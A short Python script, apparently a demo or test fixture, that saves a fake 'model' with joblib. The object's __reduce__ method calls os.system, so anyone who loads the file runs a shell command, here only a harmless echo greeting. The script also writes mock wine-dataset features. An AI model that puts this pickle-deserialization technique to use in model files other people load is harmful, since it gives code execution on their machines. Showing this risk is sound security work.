
import pandas as pd
from sklearn.datasets import load_wine
import joblib
import os


class PickleAttack:
    def __init__(self): ...

    def __reduce__(self):
        # os.system will execute the command
        return (os.system, ('echo "👋 Hello there, I\'m a pickle attack! 🥒"',))


def create_model():
    return PickleAttack()

def serialize_model(model, args):
    with open(args.model_out, "wb") as f:
        joblib.dump(model, f)

def write_mock_features(args):
    wine = load_wine()
    df = pd.DataFrame(wine.data, columns=wine.feature_names)
    df.to_parquet(args.features_out)


if __name__ == "__main__":

    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument("--model_out", type=str, default="model.joblib")
    parser.add_argument("--features_out", type=str, default="feature.parquet")
    args = parser.parse_args()

    model = create_model()
    serialized_model = serialize_model(model, args)
    print("Serialized model")

    write_mock_features(args)
    print("Created mock features")
